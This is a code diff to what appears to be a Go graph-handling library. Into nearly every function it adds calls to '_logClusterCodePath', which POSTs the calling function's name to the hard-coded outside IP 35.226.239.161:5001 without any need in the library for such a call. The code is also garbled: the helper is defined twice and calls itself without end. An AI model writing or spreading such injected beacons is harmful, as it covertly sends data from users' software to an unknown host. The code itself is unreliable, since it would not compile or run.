@@ -35,6 +35,8 @@ func (n Node) DOTAttributes() []dot.Attribute {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return []dot.Attribute{{Key: "label", Value: fmt.Sprintf("%q", n.UniqueName)}}
 }
 
@@ -43,6 +45,8 @@ type UniqueName string
 type UniqueNameFunc func(obj interface{}) UniqueName
 
 func (n UniqueName) UniqueName() string {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -74,6 +78,8 @@ func (n UniqueName) String() string {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return string(n)
 }
 
@@ -87,6 +93,8 @@ type UniqueNodeInitializer interface {
 type NodeInitializerFunc func(Node) graph.Node
 
 func EnsureUnique(g UniqueNodeInitializer, name UniqueName, fn NodeInitializerFunc) graph.Node {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -134,9 +142,13 @@ func NewEdge(from, to graph.Node, weight float64, kinds ...string) Edge {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return Edge{Edge: simple.Edge{F: from, T: to, W: weight}, kinds: sets.NewString(kinds...)}
 }
 func (e Edge) Kinds() sets.String {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -168,9 +180,13 @@ func (e Edge) IsKind(kind string) bool {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return e.kinds.Has(kind)
 }
 func (e Edge) DOTAttributes() []dot.Attribute {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -221,6 +237,8 @@ func (namer) ResourceName(obj interface{}) string {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	switch t := obj.(type) {
 	case uniqueNamer:
 		return t.UniqueName().String()
@@ -253,10 +271,14 @@ func New() Graph {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	g := simple.NewDirectedGraph(1.0, 0.0)
 	return Graph{DirectedBuilder: g, GraphDescriber: typedGraph{}, uniqueNamedGraph: newUniqueNamedGraph(g), internal: g}
 }
 func (g Graph) String() string {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -303,6 +325,8 @@ func (g Graph) Edges() []graph.Edge {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return g.internal.Edges()
 }
 func (g Graph) RemoveEdge(e graph.Edge) {
@@ -320,9 +344,13 @@ func (g Graph) RemoveEdge(e graph.Edge) {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	g.internal.RemoveEdge(e)
 }
 func (g Graph) RemoveNode(node graph.Node) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -357,9 +385,13 @@ func (m ByID) Len() int {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return len(m)
 }
 func (m ByID) Swap(i, j int) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -391,9 +423,13 @@ func (m ByID) Less(i, j int) bool {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return m[i].ID() < m[j].ID()
 }
 func (g Graph) NodesByKind(nodeKinds ...string) []graph.Node {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -432,6 +468,8 @@ func (g Graph) PredecessorEdges(node graph.Node, fn EdgeFunc, edgeKinds ...strin
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	for _, n := range g.To(node) {
 		edge := g.Edge(n, node)
 		kinds := g.EdgeKinds(edge)
@@ -455,6 +493,8 @@ func (g Graph) SuccessorEdges(node graph.Node, fn EdgeFunc, edgeKinds ...string)
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	for _, n := range g.From(node) {
 		edge := g.Edge(node, n)
 		kinds := g.EdgeKinds(edge)
@@ -464,6 +504,8 @@ func (g Graph) SuccessorEdges(node graph.Node, fn EdgeFunc, edgeKinds ...string)
 	}
 }
 func (g Graph) OutboundEdges(node graph.Node, edgeKinds ...string) []graph.Edge {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -505,6 +547,8 @@ func (g Graph) InboundEdges(node graph.Node, edgeKinds ...string) []graph.Edge {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	ret := []graph.Edge{}
 	for _, n := range g.To(node) {
 		edge := g.Edge(n, node)
@@ -518,6 +562,8 @@ func (g Graph) InboundEdges(node graph.Node, edgeKinds ...string) []graph.Edge {
 	return ret
 }
 func (g Graph) PredecessorNodesByEdgeKind(node graph.Node, edgeKinds ...string) []graph.Node {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -553,6 +599,8 @@ func (g Graph) SuccessorNodesByEdgeKind(node graph.Node, edgeKinds ...string) []
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	ret := []graph.Node{}
 	for _, outboundEdge := range g.OutboundEdges(node, edgeKinds...) {
 		ret = append(ret, outboundEdge.To())
@@ -560,6 +608,8 @@ func (g Graph) SuccessorNodesByEdgeKind(node graph.Node, edgeKinds ...string) []
 	return ret
 }
 func (g Graph) SuccessorNodesByNodeAndEdgeKind(node graph.Node, nodeKind, edgeKind string) []graph.Node {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -598,9 +648,13 @@ func (g Graph) AddNode(n graph.Node) {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	g.internal.AddNode(n)
 }
 func (g Graph) AddEdge(from, to graph.Node, edgeKind string) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -628,6 +682,8 @@ func (g Graph) AddEdge(from, to graph.Node, edgeKind string) {
 	g.internal.SetEdge(NewEdge(from, to, 1.0, kinds.List()...))
 }
 func (g Graph) addEdges(edges []graph.Edge, fn EdgeFunc) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -675,6 +731,8 @@ func NodesOfKind(kinds ...string) NodeFunc {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if len(kinds) == 0 {
 		return func(g Interface, n graph.Node) bool {
 			return true
@@ -689,6 +747,8 @@ func NodesOfKind(kinds ...string) NodeFunc {
 type EdgeFunc func(g Interface, from, to graph.Node, edgeKinds sets.String) bool
 
 func EdgesOfKind(kinds ...string) EdgeFunc {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -728,6 +788,8 @@ func RemoveInboundEdges(nodes []graph.Node) EdgeFunc {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return func(g Interface, from, to graph.Node, edgeKinds sets.String) bool {
 		for _, node := range nodes {
 			if node == to {
@@ -738,6 +800,8 @@ func RemoveInboundEdges(nodes []graph.Node) EdgeFunc {
 	}
 }
 func RemoveOutboundEdges(nodes []graph.Node) EdgeFunc {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -776,6 +840,8 @@ func (g Graph) EdgeSubgraph(edgeFn EdgeFunc) Graph {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	out := New()
 	for _, node := range g.Nodes() {
 		out.internal.AddNode(node)
@@ -784,6 +850,8 @@ func (g Graph) EdgeSubgraph(edgeFn EdgeFunc) Graph {
 	return out
 }
 func (g Graph) Subgraph(nodeFn NodeFunc, edgeFn EdgeFunc) Graph {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -822,6 +890,8 @@ func (g Graph) SubgraphWithNodes(nodes []graph.Node, fn EdgeFunc) Graph {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	out := New()
 	for _, node := range nodes {
 		out.internal.AddNode(node)
@@ -830,6 +900,8 @@ func (g Graph) SubgraphWithNodes(nodes []graph.Node, fn EdgeFunc) Graph {
 	return out
 }
 func ExistingDirectEdge(g Interface, from, to graph.Node, edgeKinds sets.String) bool {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -861,9 +933,13 @@ func ReverseExistingDirectEdge(g Interface, from, to graph.Node, edgeKinds sets.
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return ExistingDirectEdge(g, from, to, edgeKinds) && ReverseGraphEdge(g, from, to, edgeKinds)
 }
 func ReverseGraphEdge(g Interface, from, to graph.Node, edgeKinds sets.String) bool {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -884,6 +960,8 @@ func ReverseGraphEdge(g Interface, from, to graph.Node, edgeKinds sets.String) b
 	return false
 }
 func AddReversedEdge(g Interface, from, to graph.Node, edgeKinds sets.String) bool {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -922,9 +1000,13 @@ func newUniqueNamedGraph(g graph.Builder) uniqueNamedGraph {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return uniqueNamedGraph{Builder: g, names: make(map[UniqueName]graph.Node)}
 }
 func (g uniqueNamedGraph) FindOrCreate(name UniqueName, fn NodeInitializerFunc) (graph.Node, bool) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -963,6 +1045,8 @@ func (g uniqueNamedGraph) Find(name UniqueName) graph.Node {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if node, ok := g.names[name]; ok {
 		return node
 	}
@@ -972,6 +1056,8 @@ func (g uniqueNamedGraph) Find(name UniqueName) graph.Node {
 type typedGraph struct{}
 
 func (g typedGraph) Name(node graph.Node) string {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -1013,6 +1099,8 @@ func (g typedGraph) Object(node graph.Node) interface{} {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	switch t := node.(type) {
 	case objectifier:
 		return t.Object()
@@ -1024,6 +1112,8 @@ func (g typedGraph) Object(node graph.Node) interface{} {
 type kind interface{ Kind() string }
 
 func (g typedGraph) Kind(node graph.Node) string {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -1058,6 +1148,8 @@ func (g typedGraph) EdgeKinds(edge graph.Edge) sets.String {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	var e Edge
 	switch t := edge.(type) {
 	case Edge:
@@ -1070,6 +1162,8 @@ func (g typedGraph) EdgeKinds(edge graph.Edge) sets.String {
 	return e.Kinds()
 }
 func NodesByKind(g Interface, nodes []graph.Node, kinds ...string) [][]graph.Node {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -1117,6 +1211,8 @@ func IsFromDifferentNamespace(namespace string, node graph.Node) bool {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	potentiallySyntheticNode, ok := node.(ExistenceChecker)
 	if !ok || potentiallySyntheticNode.Found() {
 		return false
@@ -1146,6 +1242,27 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
@@ -1220,5 +1337,5 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
-	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
